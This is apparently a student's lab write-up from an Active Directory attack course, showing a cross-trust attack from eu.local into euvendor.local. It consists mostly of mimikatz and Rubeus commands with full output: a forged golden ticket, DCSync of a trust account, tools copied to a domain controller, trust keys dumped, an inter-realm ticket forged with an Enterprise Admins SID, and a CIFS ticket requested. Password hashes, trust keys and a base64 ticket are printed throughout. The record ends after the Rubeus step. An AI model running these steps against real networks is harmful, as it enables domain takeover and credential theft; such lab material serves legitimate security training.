# Hands-On 25:

```
Using the DA access to eu.local:
− Access eushare on euvendor-dc.
− Access euvendor-net using PowerShell Remoting.
```

## Index Of COntent

  1. [Using DA accss to eu local](#using-da-access-to-eu-local)
  2. [Accesss eushare on euvendor dc](#access-eushare-on-euvendor-dc)
  3. [Access euvendor net using powershell remoting](#access-euvendor-net-using-powershell-remoting)

## Using DA accss to eu local

Using a Golden Ticket technique in order to gain access to eu.local, with BetterSafetykatz, the SID and the aes256 hash are from krbtgt user dumped on the hands-on 23:
```
C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
User      : Administrator
Domain    : eu.local (EU)
SID       : S-1-5-21-3657428294-2017276338-1274645009
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d - aes256_hmac
Lifetime  : 3/3/2023 11:37:46 AM ; 2/28/2033 11:37:46 AM ; 2/28/2033 11:37:46 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eu.local' successfully submitted for current session

```
Dump lda process from euvendor machine:
```
mimikatz # lsadump::dcsync /user:eu\euvendor$ /domain:eu.local
[DC] 'eu.local' will be the domain
[DC] 'EU-DC.eu.local' will be the DC server
[DC] 'eu\euvendor$' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : EUVENDOR$

** SAM ACCOUNT **

SAM Username         : EUVENDOR$
Account Type         : 30000002 ( TRUST_ACCOUNT )
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Account expiration   :
Password last change : 3/2/2023 8:03:08 PM
Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: 464f502f11ac9d3467ca8b262641ad81
    ntlm- 0: 464f502f11ac9d3467ca8b262641ad81
    ntlm- 1: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 2: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 3: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 4: cb08a40c6f30fe424b35ec5eeb6d2521
    ntlm- 5: cb08a40c6f30fe424b35ec5eeb6d2521
    ntlm- 6: 2588ced1a175a36e903bd0e3fc9a3dea
    ntlm- 7: 889b3562e5f5d9b8510226d5bcc48e11
    ntlm- 8: 889b3562e5f5d9b8510226d5bcc48e11
    ntlm- 9: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-10: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-11: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-12: 03a53f7d2a322bf8b7facee24239df1b
    ntlm-13: 9d92a486171fa1af31b8de0ea71408b2
    ntlm-14: 9d92a486171fa1af31b8de0ea71408b2
    ntlm-15: 5085344c510c2839d89c4f11addd29cc
    ntlm-16: 5085344c510c2839d89c4f11addd29cc
    ntlm-17: 45490512f85afc14d3383047b9b71517
    ntlm-18: 45490512f85afc14d3383047b9b71517
    ntlm-19: 45490512f85afc14d3383047b9b71517
    ntlm-20: 629b1eaa7ec6cfe2f4943a853ad6b36b
    ntlm-21: 05c042eb6d4c3dd121acaa018f6ad8f1
    ntlm-22: 05c042eb6d4c3dd121acaa018f6ad8f1
    ntlm-23: 5a30adfcea789525d9c817e434009c46
    lm  - 0: c55de1cff294d7c7d48682dc3f1a1ca1
    lm  - 1: 8238c09007bb7d474d8a0f4c96f2a2d6
    lm  - 2: d1097e6ebe9486da499dd84650b6506f
    lm  - 3: 4a4f58b0220cb2fc39f730c01b86f97a
    lm  - 4: cab5fd8f4104800c906b5434c5c2fc75
    lm  - 5: 24bcb4dac522e596cea3a28761d96189
    lm  - 6: 8b7310f8d5531f4c1749a7334e03c478
    lm  - 7: 23eae31091bc943bd29bd210ba9cd838
    lm  - 8: 5fdd04a2ed9500082f71bdf602f88118
    lm  - 9: e8adf6a77175af931fd0fa99fde9d03f
    lm  -10: 969d27c5ad3bb6f54281b63b35d62ba2
    lm  -11: 7e0b2942a1ddba3f972f23aa8107a7dc
    lm  -12: 12d13431465bef576965543faf1f699b
    lm  -13: 979d226f24d5f90ae150857cef0cb232
    lm  -14: f6d240ceb13d76532ccea58b058750cd
    lm  -15: 3e65f0cf59ad354110656aa606c13e7d
    lm  -16: 37ca6691c09562a79cc164f9e4708aa3
    lm  -17: fb2b0edf002d9666cbb5539c22a20641
    lm  -18: b8308091021b4d8a1f0e4c4f26f91e97
    lm  -19: 652e668f36c7be56ceeccbb58f6036ba
    lm  -20: 64109dfdf4e5a6586e18d0da9baa2f47
    lm  -21: d6e5e31cb32a30857b867b44d40a5319
    lm  -22: a2073d0598ed5f8e98ea3f3bfda7f489
    lm  -23: e69547670b8bce3a07fe0f119b7a409a

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : EU.LOCALkrbtgtEUVENDOR
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 36a553d61154d59925d913cda6dc1e844cad972131d88fcdb3248e44358a40d9
      aes128_hmac       (4096) : c633953fa6a329816f468ed76061facc
      des_cbc_md5       (4096) : df43f457453125b3
    OldCredentials
      aes256_hmac       (4096) : 7a17810aca19b4d8291d142b7477dbbc903e87dc3431a9ff5bef138fe4fc97ce
      aes128_hmac       (4096) : cefbd9508aaf89357b0d8aa445cc966c
      des_cbc_md5       (4096) : a86b685d9ba8c264
    OlderCredentials
      aes256_hmac       (4096) : 7a17810aca19b4d8291d142b7477dbbc903e87dc3431a9ff5bef138fe4fc97ce
      aes128_hmac       (4096) : cefbd9508aaf89357b0d8aa445cc966c
      des_cbc_md5       (4096) : a86b685d9ba8c264

* Primary:Kerberos *
    Default Salt : EU.LOCALkrbtgtEUVENDOR
    Credentials
      des_cbc_md5       : df43f457453125b3
    OldCredentials
      des_cbc_md5       : a86b685d9ba8c264

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  dd656c38d14f8a836cf4f9620b22d734
    02  4b680ea44de8b58cba04757c6b235ea1
    03  dd656c38d14f8a836cf4f9620b22d734
    04  dd656c38d14f8a836cf4f9620b22d734
    05  6957acb1ae5d1e03bc0b18122a5c9667
    06  6957acb1ae5d1e03bc0b18122a5c9667
    07  1304f3993ea3aff18445b1f7fe35bfd8
    08  fc5bfdf82f28a9b1e37b313e5f055e8a
    09  a636e19ab19b6e4ad1a0e6496f36e31b
    10  8c64e0d966c402557bdd4ac741b56af0
    11  8c64e0d966c402557bdd4ac741b56af0
    12  fc5bfdf82f28a9b1e37b313e5f055e8a
    13  fc5bfdf82f28a9b1e37b313e5f055e8a
    14  f59b6e15dfa3fea2af8bdfb238b6d881
    15  359ed8adc76e2fc0d2d17507625b2463
    16  bc8fc68b51c0a46dbe98e6297fef2c5d
    17  85a7a4267e93bd2f4b421f7b6c9f3dd9
    18  f056b199d5851ade3cc747fe6c4d84af
    19  10ff0a7433ace516b4e0770d85bdf34f
    20  f056b199d5851ade3cc747fe6c4d84af
    21  21e615da510279346ef92055a43d94c8
    22  a6c57f4715f15728e63bec4c84ce30c0
    23  21e615da510279346ef92055a43d94c8
    24  b24de7e0f4d1415159d122c6e6eaf066
    25  606858125dd3dd20bf52227c8e2f10dd
    26  d810171e8487d7f91b3a4b70cc59fa1f
    27  0a55cb6f46ca17cb5eaffbfb2e4f4c41
    28  0dd4faaa9886d2c859da6f43598eaf07
    29  0a55cb6f46ca17cb5eaffbfb2e4f4c41


```
## Accesss eushare on euvendor dc
Review cached tickets:
```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (2)

#0>     Client: Administrator @ eu.local
        Server: krbtgt/eu.local @ eu.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/3/2023 11:37:46 (local)
        End Time:   2/28/2033 11:37:46 (local)
        Renew Time: 2/28/2033 11:37:46 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ eu.local
        Server: ldap/EU-DC.eu.local @ EU.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/3/2023 11:37:51 (local)
        End Time:   3/3/2023 21:37:51 (local)
        Renew Time: 3/10/2023 11:37:51 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: EU-DC.eu.local
```
Copy binaries to eu-dc.eu.local:

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe /Y
Does \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\BetterSafetyKatz.exe
1 File(s) copied

C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe /Y
Does \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

```
Accesss to eu-dc.eu.local:

```
C:\Windows\system32>winrs -r:eu-dc.eu.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
EU-DC

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f7f9:b2b9:5130:1891%3
   IPv4 Address. . . . . . . . . . . : 192.168.12.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.12.254


```

The next step with BetterSafetykatz or mimikatz dump the trust-keys and prform an golden intraforest ticket:

Dump Trust keys:
```
C:\Users\Public>.\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::trust /patch

Current domain: EU.LOCAL (EU / S-1-5-21-3657428294-2017276338-1274645009)

Domain: US.TECHCORP.LOCAL (US / S-1-5-21-210670787-2521448726-163245708)
 [  In ] EU.LOCAL -> US.TECHCORP.LOCAL
    * 3/3/2023 8:05:45 PM - CLEAR   - 57 a7 6d b6 12 ab 51 56 2b c6 e8 97 0b 31 ae 4f 30 b8 c1 0f 6c eb dd e9 d6 4a c2 9c 3c 7a 00 d2 0b 0a 81 02 9c d5 fc 1e aa 60 f5 4b 63 ef 33 56 4b 7d ae 41 58 85 8a a9 67 1e 06 c3 4a f8 50 e8 2f 75 22 b0 70 63 e7 a8 ec 36 3a a9 fd 96 f1 01 69 92 7f 43 ce 0c 56 fd f5 50 14 fc 2b 0e 13 fe b4 09 42 48 cc ef 95 bd 43 bc 34 da b9 b1 09 13 0d bb cf 85 7b e5 74 48 b7 c6 66 b6 a9 77 c6 c9 f8 4c ba 09 68 70 c9 4b 40 44 4b 59 69 1b df 4d 44 09 0e 8e aa c6 af bd 79 0b 76 52 ca e1 f1 99 27 d8 5e 70 08 32 15 a7 df 38 77 45 e2 5d 13 d2 a7 2e e7 07 32 c0 98 f5 7d 37 94 99 20 84 67 80 a4 f2 13 a5 d0 ef b1 e9 bf 6f e5 22 87 43 ea 25 d2 23 29 94 c0 e8 ff 9d ca 2f b6 79 94 1c 1b bf af 7e bc 65 ad c0 2b fb 47 b5 cc 1c a9 98 75 f6
        * aes256_hmac       ff0626e140d710c7b8b0ececc7077793169e18cae4b2cc70a90004bba46579f7
        * aes128_hmac       51ba184b479858abcbcd2cb0a9f437ef
        * rc4_hmac_nt       32d4e11814ebeaf5044d3b35f6f8d6b0

 [ Out ] US.TECHCORP.LOCAL -> EU.LOCAL
    * 3/3/2023 8:02:34 PM - CLEAR   - 0d 84 dd ce 24 e2 0f 30 55 eb 90 66 53 d8 4e 10 01 7c d1 ce d8 62 2b 8f 1d eb 51 cd 76 ed 79 dd 90 4c 15 bb 33 aa e1 fb 1b ea d6 3c 50 41 2a ed 72 f8 75 c8 eb 51 e6 03 ec 35 09 33 68 9b c0 47 48 68 0f fa 65 ed 44 c9 6f 21 a6 d3 f5 f2 77 ad 8d 56 49 50 07 72 8a 22 e4 37 56 b9 07 98 8f ab d7 ef 4c 63 05 8e 77 c5 27 0c 2f b8 46 ec 12 40 22 a1 d0 09 82 e5 8c c7 aa c7 e8 7b 3c d4 51 8c de 41 ce 88 f8 a9 f3 d3 21 87 20 f5 65 42 31 9f c5 18 7b 47 03 16 d1 8a bb 73 65 7b cf f8 1e 81 a7 da 2b 42 49 d4 8c 5f e1 8f dd 91 54 99 6f df 20 ef cc 3c 35 dc f2 ff 33 d1 82 e7 e1 d0 4c 9f 93 b2 df 50 1b c6 21 29 4c b8 ca 45 cd d6 55 db 87 3e 1b bf 74 ad 38 cf 90 93 3e 8c d2 54 9c 91 67 2f 1b 20 3f ef 81 9d c4 e9 fe 2d 1d 2c 9f 46
        * aes256_hmac       823258a8c5a011834594c5366362a2a967d826887456a689549d20dd5b4ba372
        * aes128_hmac       c7c80293458c07a0e3bdaa287b3bdc43
        * rc4_hmac_nt       9f153d6fa608f801a6fd817132130876

 [ In-1] EU.LOCAL -> US.TECHCORP.LOCAL
    * 12/11/2022 8:35:35 AM - CLEAR   - 42 87 57 28 a5 34 b0 c2 b8 31 9c 05 57 61 de 88 73 71 e3 b0 b8 ac 87 f8 1e 5f 2c c7 66 fb 6c 89 0b a7 eb 30 04 a2 11 f2 7f 24 1e 1c ab 25 43 bf 31 98 cb b1 96 9e 86 80 d2 83 cc 62 b4 f8 33 66 7d 62 04 b3 ab 6a a2 c8 c9 6a 0b 40 87 ff 37 67 0a 78 ae ea 93 02 33 3f 50 fc 19 d2 16 ab 4d 5d 27 af cf 01 f8 8f eb af 5a a1 15 3c ba 5a 9f 98 c2 22 22 8c b7 6d 6b b2 04 aa a1 8c 72 f6 fc b4 78 83 b3 f0 2e f2 ba c2 8d 44 f6 2c 8b 4c 6b 1a c0 19 9d fc e7 b4 a9 ac b0 79 fe e4 78 d8 19 b2 0f 28 9c 19 3e 32 d1 76 f9 a7 9a 10 eb da 33 ce e3 91 db fd dc 03 6a a5 22 64 d1 8b 19 60 81 8e 15 0b fc 27 90 26 63 e8 ae 12 61 06 7b 33 60 f4 7a 32 23 f6 f3 bd 03 d0 90 b0 d2 c8 3b 60 9c c0 fd 6d fc b5 e6 b2 c7 2c 4e af 35 83 62 4c ce 2f
        * aes256_hmac       b687515d5f74d8aa87a2755fea6eb13713df31668d8d522d916a9dc91565d37c
        * aes128_hmac       d8a7f052a1450f9f8343f784027f11fd
        * rc4_hmac_nt       6deccf44bd8c61b7494a4bcce4622fc5

 [Out-1] US.TECHCORP.LOCAL -> EU.LOCAL
    * 3/3/2023 8:02:34 PM - CLEAR   - 50 7a 16 35 98 ae e6 65 0d 41 99 b5 c7 c5 f0 0d 63 ea b1 d8 84 67 df 40 41 ca cd 92 e7 b0 5c 7b 08 b7 c7 62 94 0f f0 d8 e7 2e 46 e2 8d 9b a1 f4 3b a6 ab a5 7b c5 9c 12 d4 e7 f5 5a 5d 85 ea ea fc 4f 8f 39 42 ae 04 2d 1e 24 10 c7 81 84 b6 0d 4f 4b a9 ef 8e cd 61 e5 0a dd e0 0c 70 48 5f 27 74 41 fb 35 bb 16 e7 fd 0a a6 23 5a 1b de 53 7d 06 ab b0 0d 80 12 6e 83 2f b5 38 85 2f b2 68 91 9a c3 e1 d9 73 9e bd d4 0c 79 8b 05 a1 d4 3a ee 4f 81 bd 90 2e 8e dd 9b 78 e1 00 45 b1 6a fd 7f f6 0e de 01 8e fd 30 80 f1 7c 8e 5f 5e 4f 00 98 66 90 ce 09 d9 8e a4 c8 17 ab 6c c0 12 a6 22 bb f1 a3 61 bb 32 73 27 ba ba 0a 20 85 45 9d 55 68 88 fd 07 75 82 db 37 cc b5 1f 6e c4 7f e0 0b 4f 78 95 ce 71 3f 98 5d c0 c3 b0 7a 33 8e f9 24 85
        * aes256_hmac       99041b743c444af5205cc2f8e2842c290af5f9fde732bd37833a354f7224ebac
        * aes128_hmac       1862ad074db1882131c3c3e338594972
        * rc4_hmac_nt       94622325b64320a2376df0cecd73fcad


Domain: EUVENDOR.LOCAL (EUVENDOR / S-1-5-21-4066061358-3942393892-617142613)
 [  In ] EU.LOCAL -> EUVENDOR.LOCAL
    * 3/3/2023 8:03:22 PM - CLEAR   - 31 f4 5f 92 cf bf 35 2d ab 4a 47 2d ed 60 5c 87 23 6c e8 42 d6 4f cb 0b c6 6b 6c 08 5b 04 62 e0 df 89 d6 8c cc e5 2e c7 0c 7a 82 b9 12 d7 92 9e d1 3e fc 90 55 23 ea 60 e6 5b 09 73 a7 84 8e 23 12 13 2c c7 36 72 f6 25 cd 71 b1 e7 14 e3 e2 08 75 71 a0 95 53 e0 e8 34 a1 e1 76 f5 13 02 8c f4 04 9b b6 82 de b2 1a 8b 2c dd 05 4d d8 3f 4f cf 9e e2 7c 7d 37 a3 cf 4f 54 fb c8 cb 3f 62 ff dd e6 9c 13 03 8c 7b 25 9b 0e 28 4e 93 ff a8 4c 78 11 9c 98 66 65 a5 33 eb 91 46 40 21 94 09 e4 3e 8e dc 3b e3 b0 d0 db 2b b3 76 bf f9 80 e6 e0 f9 55 db ea 8d d7 16 a9 0b fe 81 86 18 71 f7 97 c1 68 36 92 0a 1d 99 36 3a 2b 6d a6 60 d4 5f 3a ec ab 6a bc da a0 4a 83 68 78 be ba 8d a6 2c c2 b5 c1 3c 6e d3 71 ec 6a 24 c0 82 9e d4 93 f7 aa 82
        * aes256_hmac       8758ae95d532ae6ecbbd78f47eda40d582b33853c8e12d767b98969cc7abea6d
        * aes128_hmac       04ab9f7a628d80a1a3ba6902dc713021
        * rc4_hmac_nt       93172cd5469514038b20ce9088ed63ea

 [ Out ] EUVENDOR.LOCAL -> EU.LOCAL
    * 3/3/2023 8:02:34 PM - CLEAR   - 11 63 3f 37 8b e1 20 e2 52 06 d4 08 1c 9f fd 5b a8 79 41 c4 00 5a 12 df 3a 70 24 7c 16 ee bf 2b 6f 0e fa 61 1c 3b ce 39 eb 35 74 ee cc 1e fc 5b 23 f3 6c eb f9 e4 70 c2 37 6e 00 55 30 48 bc 94 ac c6 a6 f8 3f af 27 23 c1 5a 78 fb 25 0d 19 6b cd f4 81 9c ae 48 a2 c9 29 3b d3 e6 92 49 24 33 ac 77 59 15 28 e3 d4 b5 4a 21 02 89 64 50 bc 93 15 08 bb 8e f3 52 ac e5 31 0f fa 4f 87 4e 0f 10 e3 17 5c a2 9b 1e 16 c0 dc f0 4c c9 20 df 83 25 56 99 dd a4 e6 b5 ac 6d c8 e0 c5 b4 b2 37 81 35 78 e0 aa e1 e8 0f 30 ac 55 a9 db 0a 69 10 c2 87 0f 98 3a c3 1c 74 0b 46 9f cc 7a 4b 86 48 f3 81 10 b7 6d 78 09 12 c9 ba d9 41 ae 37 4d 77 d7 34 ea 1a 69 90 1b 3c f0 be 8c 22 e2 4c ea 5f fb f4 65 2b 85 96 18 b8 7a d1 02 9c a7 bb 25 9a 8b f3
        * aes256_hmac       d74d0bdb9dd68f138995becef3b25409798aae47db893386e900574ba5490446
        * aes128_hmac       cd2ba46d7cd174fe52745bf4aefd0c95
        * rc4_hmac_nt       47f8ce231330d294bf5bbcc0fd83a37f

 [ In-1] EU.LOCAL -> EUVENDOR.LOCAL
    * 12/11/2022 8:35:29 AM - CLEAR   - 09 90 ce b0 24 89 ca f3 29 2d 56 3a 8b a0 dd fa a3 26 fe 19 3f dc 78 7b 34 e9 89 57 90 57 56 d2 df e3 30 1a 2f 80 67 2c a8 47 95 bd 16 d9 87 85 9b 37 29 d5 ac b6 53 9a 2e 98 43 1c 25 e0 3b 2f cf 98 b8 1d bf e9 60 b8 30 4c 31 e4 cd e1 a6 b5 ba 6c 7a c3 00 69 bc 48 c2 a4 d0 a7 c8 cb cb c3 dc e5 58 19 89 2e 11 86 e0 6b bf 3c 8b 51 39 c6 7e 0c cd 49 64 ca 09 ea 7e 41 bc c3 4e 0c 7b 33 d4 b5 90 5e 11 52 22 b2 a9 f8 a1 cf 23 8b f2 3a b9 4f 81 40 dc 63 04 55 11 8d b7 e7 5d b3 fa 4d 3c 74 ef ac 6e 76 92 c4 7c b1 30 48 92 6b 0b a8 7e e5 48 de a7 42 e4 46 6a 20 df 75 c6 72 79 6f 3e 2d 1b de 9e d5 18 87 7c 17 b9 b9 7a fb 00 a7 76 dd 63 c9 b6 87 d8 dc df bb 1c 0c eb 88 f1 ba d6 0d 32 f7 fa 09 e8 4d e3 38 8d 04 2f 6a 3c 0d
        * aes256_hmac       6c6c100c6fbba8a13240617f13afdc3af1743e15e739e52ab2b7c518f89b5a87
        * aes128_hmac       29f7336467a6abd1546ab64fc8860c74
        * rc4_hmac_nt       1fe7ba25b640f278725598e76f8f89b9

 [Out-1] EUVENDOR.LOCAL -> EU.LOCAL
    * 3/3/2023 8:02:34 PM - CLEAR   - 85 70 db 85 c1 15 06 50 1f e8 51 81 1a 21 99 f0 95 ea 75 8f d5 a1 06 c3 f6 04 86 a1 c3 83 83 86 c1 84 f9 cb 3f 9b 17 21 d6 e7 f3 7c 36 4c ea 00 c2 ed c1 bf 3d 85 02 ba 28 2d e8 a7 24 c3 7f 46 1b f5 09 ad 61 40 fd 04 26 3c 02 42 ad e3 57 b4 34 ee ce 2c 11 37 2e 32 b0 92 ad eb 7e de a9 29 48 b0 33 79 be 15 0b cb e1 c2 df 7f af 3d f8 b7 49 5f 1c 80 01 ba 5f bf e5 5a 24 45 e8 06 58 1d 2e 5c 79 6d e5 57 97 cd ac ec 15 b7 38 20 a0 cf cc 2b e0 1b 14 6f 52 c2 ba f8 73 a9 53 a2 ef 9d b0 0c 7f 5f 19 a1 bf 17 4b 50 ac 70 99 26 ec 56 d4 30 3a de d4 e9 03 b6 0f bf 0a cc b8 53 73 cb 97 be 1f 79 56 67 96 b0 ff bd 0f 27 98 4e d8 35 b7 ee 94 85 08 57 56 7b 0d 5a 16 fa e4 52 5c c3 e7 f8 29 21 d3 d1 44 75 ce 21 88 10 87 de 58 c5
        * aes256_hmac       09711b93909b13f631f681dcfd159460db55463de5223fe002bbb65ff422555a
        * aes128_hmac       eefc8b0c366cfcd6b58561edaebbcafc
        * rc4_hmac_nt       64c01dabec2bb7675462534830395957

```
Generate golden intra :
- Validate : SID (current domain)
- validate : SIDS (target domain with value 519)
- Validate : rc4 (of current trust retationship  eu.local --> euvendor.local)

```
mimikatz # kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:93172cd5469514038b20ce9088ed63ea /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\intra-golde.kirbi
User      : Administrator
Domain    : eu.local (EU)
SID       : S-1-5-21-3657428294-2017276338-1274645009
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-4066061358-3942393892-617142613-519 ;
ServiceKey: 93172cd5469514038b20ce9088ed63ea - rc4_hmac_nt
Service   : krbtgt
Target    : euvendor.local
Lifetime  : 3/4/2023 8:24:01 AM ; 3/1/2033 8:24:01 AM ; 3/1/2033 8:24:01 AM
-> Ticket : C:\Users\Public\intra-golde.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
```
Use the exportd kirbi golden ticket to perform the pth attack with rubeus:

```
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\intra-golde.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'CIFS/euvendor-dc.euvendor.local'
[*] Using domain controller: euvendor-dc.euvendor.local (192.168.12.212)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFEDCCBQygAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoRAbDkVVVkVORE9SLkxPQ0FMoi0w
      K6ADAgECoSQwIhsEQ0lGUxsaZXV2ZW5kb3ItZGMuZXV2ZW5kb3IubG9jYWyjggOwMIIDrKADAgESoQMC
      AQOiggOeBIIDmh80xkpy5o7J+jrMNJOCb1zLkweFTB2jkNr4MiRzUzRUIHbQnS8odqOv4Evr1BBMNAn9
      qi5b8HoAaUIcHKE0rAsHZZkW/BPHJtHdl5EdfnwVplrHLLRB4gY7UX+sNRDx3fjOVt40D4vToNt2lp7L
      NxJ2bNMXYAUO4ZCX6NcCR47G74NcOpTJcxjkfBUTsKbnhdSPQCnxQ8kjldEsdBaGpxyXny9qUZDSwdK8
      SperbZiHok3hKFG+dykoUdYxB5mLW992vHGNc1htH78YaZOsT/nO9/d0cMPTd6neKyGQqhNgMF5sn6VZ
      Bg4Hb/jfYv6/G1gMlthO0YMzuDNvmzWDd+0PU/GuqgL4MOAyMn4G/SQouoX3O/gxmBZjyCRzn/zBeVqU
      u6O6K3fV2ElPiokRTdgan2clld6tzeJ4dypwux/1zXbj40bj6+sryNo7wEerPogzwKRxKovFj4ynSNJ/
      WVlLgLSZSi6FYG5Y1/y01vtyC8Ze4JV8jMYrFKux0RtJYvR9eknoXu6p0psQHQLGoQ57NQ9KbsRd/fOf
      Sw6pNoCea+GZkCY2LFME+lq4BJjfIKt/HQedPhPPa045iFYr+liechKqB2aqvsEJT8yJwPKR8b1e2BtJ
      TAL2TE812btSGWplL2hwPRz1ySAOPHMD5W1StATKaED/ON9oxJJW2gfkgdUDZVPxrE2Wv4uDUxMVgTl3
      dR9wi1czM8DVVrVZZGZY78Q7aYQ9kXkfDr4R4iyTpraNaxDqq9jnh2j16VtGtB6Z00da6I2uI4/rxPdb
      DzdYHz87sHmEU1XiZdRIjs30rKlrU5QWuyBV0nGuyoVbNmx3G4QbnP7kFdc+ntDN6SsqEL/TnsEMXi1c
      GPu0EXllBSAvmAiBftTrqDiq3hN+EgnLJKxKu4Kxxo5XDBIbmxGiorD1KhnW5QEY2yXGozHRDTlIkT6+
      V3zsaYIWEng4w1ik5yDVqovV+Nw6lwhn0wmo3Q7vuA8zwHRV1/T/dBS9kC6MXuQ4pWNytlKe3zAd1ap9
      vCWkueFepvyrOI/CnyMVJNVyFe05qqs+O5o8qbhf5zxx7VyX+0rXMees05klCz0lT9qpJRc3AouaDATf
      Dh4KnAcqVfCKTrAOcvgVdxwPL1/00ahRa74kg3+rtbHgqUTsaJol/sc0FWjTzYfLMAJUNNXQtKJJX9Cb
      zkBYqP892FZx9FCeOjDv7uDLZHwhOf6CafsKbIfbnmijgfUwgfKgAwIBAKKB6gSB532B5DCB4aCB3jCB
      2zCB2KArMCmgAwIBEqEiBCAYnRjR3vSF8uM3HZbC2gc/eu+naCe5t3jKCXqEdwQeV6EKGwhldS5sb2Nh
      bKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyMzAzMDQxNjI2MTRaphEY
      DzIwMjMwMzA1MDIyNjE0WqcRGA8yMDIzMDMxMTE2MjYxNFqoEBsORVVWRU5ET1IuTE9DQUypLTAroAMC
      AQKhJDAiGwRDSUZTGxpldXZlbmRvci1kYy5ldXZlbmRvci5sb2NhbA==

  ServiceName              :  CIFS/euvendor-dc.euvendor.local
  ServiceRealm             :  EUVENDOR.LOCAL
  UserName                 :  Administrator
  UserRealm                :  eu.local
  StartTime                :  3/4/2023 8:26:14 AM
  EndTime                  :  3/4/2023 6:26:14 PM
  RenewTill                :  3/11/2023 8:26:14 AM
